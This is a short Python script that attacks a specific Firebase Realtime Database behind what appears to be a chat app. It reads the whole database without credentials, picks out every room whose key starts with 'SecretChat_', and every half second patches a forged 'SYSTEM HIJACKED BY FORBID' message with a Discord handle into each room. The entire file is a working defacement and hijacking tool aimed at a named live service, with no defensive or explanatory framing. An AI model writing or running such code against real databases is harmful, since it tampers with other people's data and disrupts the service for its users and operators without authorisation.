import time
import requests

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Total Identity Override Active...")

session = requests.Session()

while True:
    try:
        # Step 1: Scan all active server rooms
        root_response = session.get(f"{database_url}/.json", timeout=5)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                for key in data.keys():
                    if key.startswith("SecretChat_"):
                        room_url = f"{database_url}/{key}.json"
                        
                        # Force your identity and message for any activity in the room
                        hijack_payload = {
                            "ForcedOverride": {
                                "Sender": "FORBID [HACKED]",
                                "Message": "SYSTEM HIJACKED BY FORBID, DISCORD: forbiddenway",
                                "Timestamp": int(time.time() * 1000),
                                "Aura": "voidWings",
                                "Color": "red"
                            }
                        }
                        
                        # Patch the room so your identity dominates the chat window
                        session.patch(room_url, json=hijack_payload, headers=headers, timeout=2)
                        
        time.sleep(0.5)
        
    except Exception as e:
        print(f"[FORBID] Error: {e}")
        time.sleep(1)
